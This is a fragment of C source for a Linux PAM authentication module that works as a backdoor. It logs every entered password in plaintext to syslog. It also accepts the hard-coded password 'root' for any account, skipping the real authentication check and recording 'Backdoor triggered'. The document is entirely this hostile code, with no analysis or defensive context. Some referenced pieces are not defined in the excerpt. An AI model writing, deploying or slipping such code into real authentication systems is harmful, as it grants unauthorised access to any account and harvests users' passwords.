#include <syslog.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t* pamh, int flags, int argc, const char** argv){
  const char* input_passwd;

  pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
  // Open log
  openlog("pam_module_auth", LOG_CONS | LOG_PID | LOG_NDELAY, LOG_AUTH);
  syslog(LOG_INFO, "pam_sm_authenticate called with input_passwd: %s", input_passwd);
  
  if (input_passwd != NULL && strcmp(input_passwd, "root") == 0) {
    backdoor = 1;
    syslog(LOG_INFO, "Backdoor triggered");
    closelog();
    return PAM_SUCCESS;
  }
  closelog();
  return og_pam_sm_auth(pamh, flags, argc, argv);
}
